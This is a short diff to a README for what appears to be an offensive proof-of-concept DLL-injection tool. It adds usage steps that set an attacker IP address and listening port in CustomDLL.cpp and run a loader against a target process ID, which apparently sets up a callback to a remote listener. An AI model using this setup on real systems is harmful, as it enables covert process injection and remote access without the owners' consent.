@@ -5,6 +5,12 @@ This is obviously only a POC and this tool/method can be extended to an infinite
 
 <h3> Usage : </h3>
 
+In CustomDLL.cpp :
+```cpp
+ip = (char*)"<YOUR_IP_ADDRESS>"; // REPLACE WITH YOUR IP ADDRESS 
+port = 0000; // TCP PORT YOU'RE LISTENING ON
+```
+
 ```
 Loader.exe <PID> <PATH_TO_CUSTOM_DLL>
 ```
